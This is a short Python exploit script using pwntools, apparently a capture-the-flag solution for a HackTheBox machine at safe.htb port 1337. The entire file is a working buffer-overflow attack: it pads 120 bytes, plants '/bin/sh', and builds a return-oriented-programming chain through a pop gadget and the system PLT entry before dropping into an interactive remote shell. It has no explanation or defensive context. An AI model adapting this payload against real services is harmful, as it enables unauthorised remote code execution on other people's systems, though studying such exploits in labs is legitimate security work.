#!/usr/bin/python3
from pwn import remote, p64

shell = remote("safe.htb", 1337)

bin_sh = b"/bin/sh\x00"

offset = 120
junk = b"A" * (offset - len(bin_sh))

pop_r13_r14_r15 = p64(0x0000000000401206)
plt_system = p64(0x0000000000401040)
test = p64(0x0000000000401152)
null = p64(0)

payload =  b""
payload += junk
payload += bin_sh
payload += pop_r13_r14_r15 + plt_system + null + null
payload += test

shell.recvline()
shell.sendline(payload)
shell.interactive()
